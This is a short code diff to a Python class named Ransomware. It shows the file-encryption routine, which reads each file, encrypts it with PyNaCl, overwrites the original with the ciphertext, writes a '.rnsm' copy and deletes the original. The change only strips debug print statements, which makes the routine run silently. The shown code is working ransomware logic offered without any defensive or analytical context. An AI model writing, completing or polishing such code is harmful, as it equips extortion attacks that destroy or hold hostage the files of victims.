@@ -90,18 +90,15 @@ class Ransomware:
         try:
             if not os.path.isdir(filepath):
                 # Take the original binary input of the file...
-                print(filepath)
                 with open(filepath, "rb") as original_file:
                     original_data = original_file.read()
                 # ... encrypt it using the PyNaCl box provided by the parent object...
                 encrypted_data = self.box.encrypt(original_data)
-                print("encrypted data")
                 # ... and write the encrypted binary data back in the original and newly created encrypted file.
                 with open(f"{filepath}.rnsm", "wb") as encrypted_file:
                     encrypted_file.write(encrypted_data)
                 with open(filepath, "wb") as original_file:
                     original_file.write(encrypted_data)
-                print("encrypted file written")
                 # Lastly, remove the original file.
                 os.remove(filepath)
         except Exception as err:
